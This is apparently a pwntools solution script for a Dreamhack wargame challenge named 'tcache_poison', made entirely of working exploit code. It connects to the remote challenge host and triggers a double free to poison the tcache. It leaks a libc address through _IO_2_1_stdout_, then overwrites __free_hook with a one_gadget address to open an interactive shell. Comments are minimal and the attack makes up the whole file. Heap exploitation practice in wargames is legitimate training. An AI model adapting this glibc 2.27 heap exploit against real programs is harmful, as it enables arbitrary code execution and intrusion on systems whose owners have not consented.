#!/usr/bin/python3

from pwn import *

#p = process("./tcache_poison")
p = remote("host1.dreamhack.games", 22384)
e = ELF("./tcache_poison")
libc = ELF("./libc-2.27.so")

sla = lambda t, s: p.sendlineafter(t, s)
sa = lambda t, s: p.sendafter(t, s)
stdout = libc.sym['_IO_2_1_stdout_']
__free_hook = libc.sym['__free_hook']
oneshot = [0x4f3d5, 0x4f432, 0x10a41c]

def allocate(size, data):
    sla("t\n", str(1))
    sla(": ", str(size))
    sa(": ", data)

def free():
    sla("t\n", str(2))

def printContent():
    sla("t\n", str(3))
    p.recvuntil(": ")
    return p.recvn(6)

def edit(data):
    sla("t\n", str(4))
    sa(": ", data)

# Make DFB
allocate(48, "dreamhack")
free()
edit("AAAAAAAA\x00")
free()

# Manipulate Heap
allocate(48, p64(e.bss()))
allocate(48, "dreamhack")

# Leak libc
allocate(48, "\x60")
leak = u64(printContent().ljust(8, b"\x00")) - stdout
log.info("libc: " + hex(leak))

# Make Another DFB
allocate(0x40, "Catch")
free()
edit("AAAAAAAA\x00")
free()

# Manipulate Heap to __free_hook
allocate(0x40, p64(leak + __free_hook))
allocate(0x40, "Pwned")

# Mapping __free_hook to one_shot
allocate(0x40, p64(leak + oneshot[1]))
free()

p.interactive()
